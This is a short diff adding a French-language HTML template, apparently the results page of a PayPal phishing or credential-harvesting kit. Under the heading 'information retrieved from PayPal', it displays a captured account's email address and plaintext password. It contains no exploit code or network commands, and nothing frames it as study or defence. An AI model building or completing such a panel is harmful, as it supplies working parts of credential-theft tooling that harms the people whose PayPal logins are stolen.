@@ -1,0 +1,21 @@
+{% extends 'template.html' %}
+
+{% block title %}
+Informations récupérées de PayPal
+{% endblock %}
+
+{% block content %}
+<table id="fiche">
+    <tr>
+        <td>Email :</td>
+        <td>
+            <p>{{ account["email"] }}</p>
+        </td>
+    </tr>
+
+    <tr>
+        <td>Password :</td>
+        <td>{{ account["password"] }}</td>
+    </tr>
+</table>
+{% endblock %}
